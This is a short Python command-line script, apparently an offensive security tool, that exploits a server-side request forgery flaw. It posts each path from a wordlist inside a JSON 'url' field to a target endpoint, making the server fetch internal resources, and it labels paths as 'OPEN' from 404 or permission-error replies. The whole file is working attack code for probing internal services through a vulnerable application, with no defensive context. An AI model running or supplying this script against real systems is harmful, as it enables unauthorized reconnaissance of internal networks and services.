#!/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-p', '--paths', help='file containing list of paths to try', required=True )
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

with open(args.paths, "r") as f:
    for word in f:
        try:
            r = requests.post(url=args.target, json={"url":"{host}{path}".format(host=args.ssrf,path=word.strip())}, timeout=int(args.timeout))

            if args.verbose:
                print("{path:12} \t {msg}".format(path=word.strip(), msg=r.text))

            if "Request failed with status code 404" in r.text:
                print("{path:12} \t OPEN - returned 404".format(path=word.strip()))
            elif "You don't have permission to access this." in r.text:
                print("{path:12} \t OPEN - returned permission error, therefore valid resource".format(path=word.strip()))
            else:
                print("{path:12} \t {msg}".format(path=word.strip(), msg=r.text))
        except requests.exceptions.Timeout:
            print("{path:12} \t timed out".format(path=word.strip()))